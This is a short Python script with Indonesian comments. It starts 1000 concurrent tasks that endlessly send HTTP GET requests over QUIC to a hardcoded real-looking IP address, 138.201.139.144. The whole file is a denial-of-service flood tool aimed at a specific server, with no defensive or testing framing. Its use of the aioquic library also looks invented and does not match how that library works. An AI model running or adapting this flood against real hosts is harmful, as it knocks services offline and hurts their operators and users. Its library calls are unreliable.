import asyncio
import aioquic

# Konfigurasi target
target_url = "http://138.201.139.144/"

# Fungsi untuk mengirim request
async def send_request():
    while True:
        try:
            # Buat koneksi QUIC
            quic = aioquic.QuicConnection()
            await quic.connect(target_url)
            # Kirim request
            stream_id = quic.create_stream()
            await quic.send_request(stream_id, b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n")
            # Baca response
            response = await quic.recv()
            print(f"Response: {response}")
        except Exception as e:
            print(f"Error: {e}")

# Buat loop asyncio
async def main():
    tasks = []
    for i in range(1000):
        task = asyncio.create_task(send_request())
        tasks.append(task)
    await asyncio.gather(*tasks)

asyncio.run(main())
